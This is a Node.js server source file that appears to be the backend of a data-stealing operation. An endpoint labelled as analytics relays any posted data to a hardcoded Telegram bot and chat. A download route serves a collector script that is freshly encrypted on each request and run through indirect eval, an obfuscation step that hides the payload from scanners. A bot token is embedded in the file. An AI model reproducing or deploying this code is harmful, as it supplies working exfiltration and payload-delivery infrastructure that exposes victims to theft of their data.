require('dotenv').config();
const http = require("http"); // ЭТОГО У НАС НЕ БЫЛО В ПРОШЛОЙ ВЕРСИИ
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const fetch = require("node-fetch");

const BOT_TOKEN = "8877064200:AAFmgPQogJHfH1tlMgfgMyNVG3i6cTurBbs";
const CHAT_ID = "8120066552";

const ROOT = __dirname;
const COLLECTOR_PATH = path.join(ROOT, "collector.js");
const PORT = Number(process.env.PORT || 8787);
const HOST = "0.0.0.0";

async function sendToTelegram(data) {
  try {
    const text = JSON.stringify(data, null, 2);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: "📦 Data received:\n" + text.substring(0, 4000) }),
    });
  } catch (err) {
    console.error("Telegram error:", err);
  }
}

function send(res, status, body, headers = {}) {
  const payload = Buffer.isBuffer(body) ? body : Buffer.from(String(body));
  res.writeHead(status, {
    "content-length": payload.length,
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    ...headers,
  });
  res.end(payload);
}

function json(res, status, data) {
  send(res, status, JSON.stringify(data, null, 2), { "content-type": "application/json" });
}

function encryptedRunner(source) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const encrypted = Buffer.concat([cipher.update(source, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return `const crypto = require("crypto");
const key = Buffer.from("${key.toString("base64")}", "base64");
const iv = Buffer.from("${iv.toString("base64")}", "base64");
const tag = Buffer.from("${tag.toString("base64")}", "base64");
const encrypted = Buffer.from("${encrypted.toString("base64")}", "base64");
const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
decipher.setAuthTag(tag);
const source = Buffer.concat([decipher.update(encrypted), decipher.final()]).toString("utf8");
(0, eval)(source);`;
}

const server = http.createServer((req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type"
    });
    return res.end();
  }

  const url = new URL(req.url, `http://${req.headers.host}`);

  if (req.method === "POST" && url.pathname === "/api/v1/analytics") {
    let body = "";
    req.on("data", chunk => body += chunk);
    req.on("end", async () => {
      try {
        const data = JSON.parse(body);
        await sendToTelegram(data);
        json(res, 200, { status: "ok" });
      } catch (e) { json(res, 400, { error: "invalid" }); }
    });
    return;
  }

  if (req.method === "GET" && url.pathname === "/download/collector.runner.js") {
    const source = fs.readFileSync(COLLECTOR_PATH, "utf8");
    return send(res, 200, encryptedRunner(source), { "content-type": "text/javascript" });
  }

  json(res, 404, { error: "not found" });
});

server.listen(PORT, HOST, () => console.log(`Server listening on ${PORT}`));